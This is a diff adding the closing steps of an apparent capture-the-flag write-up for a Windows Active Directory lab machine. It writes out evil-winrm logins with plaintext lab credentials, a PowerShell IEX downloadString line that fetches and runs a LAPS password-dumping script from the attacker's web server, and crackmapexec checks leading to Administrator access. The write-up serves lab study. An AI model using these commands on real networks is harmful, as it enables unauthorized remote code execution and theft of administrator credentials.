@@ -279,6 +279,54 @@ We can validate with [Crackmapexec](../../../Tools/Active%20Directory/Crackmapex
 
 If return a match it is a good signal, this means that the login is correct
 
+Remember that the user belongs to **Remote Management Users**, this means that we can connect with evil-winrm
+
+> evil-winrm -i 10.10.11.152 -u 'svc_deploy' -p 'E3R$Q62^12p7PLlC%KWaxuaV' -S
+
+Now we can download the [script](https://github.com/kfosaaen/Get-LAPSPasswords)
+
+We can create a web server with python in our attacker machine
+
+> sudo python3 -m http.server 80
+
+And now from victim machine download the file
+
+> IEX(New-Object Net.WebClient).downloadString('http://10.10.14.109/Get-LAPSPasswords.ps1')
+
+
+Wait a moment (like 10,15 seconds) to see the get requests
+
+And now you can use the util to see the credentials
+
+> Get-LAPSPasswords
+
+![](../../../Images/Pasted%20image%2020230816015634.png)
+
+Now we can verify if the password is correct with [Crackmapexec](../../../Tools/Active%20Directory/Crackmapexec/Crackmapexec.md)
+
+> crackmapexec smb 10.10.11.152 -u 'Administrator' -p '6N9fxQU5s17q,#%7&VI+{@Xx'
+
+If we see a pwned, we know that is the password for the user Administrator
+
+![](../../../Images/Pasted%20image%2020230816015835.png)
+
+And now we can try to connect with [evil-winrm](../../../Tools/Active%20Directory/evil-winrm.md) 
+
+> evil-winrm -i 10.10.11.152 -u 'Administrator' -p '6N9fxQU5s17q,#%7&VI+{@Xx' -S
+
+![](../../../Images/Pasted%20image%2020230816020138.png)
+
+We can found the flag in the Desktop of the user TRX
+
+> cd C:\\users\\TRX\Desktop
+
+> type root.txt
+
+![](../../../Images/Pasted%20image%2020230816020445.png)
+
+![](../../../Images/Pasted%20image%2020230816020524.png)
+
+
 ---
 
 # Resources
@@ -289,4 +337,4 @@ If return a match it is a good signal, this means that the login is correct
 ---
 # Tags
 
-#machine #windows #activedirectory #crackmapexec #smbclient
+#machine #windows #activedirectory #crackmapexec #smbclient #smbmap #evilwinrm #fcrackzip #LAPS #powershellhistory
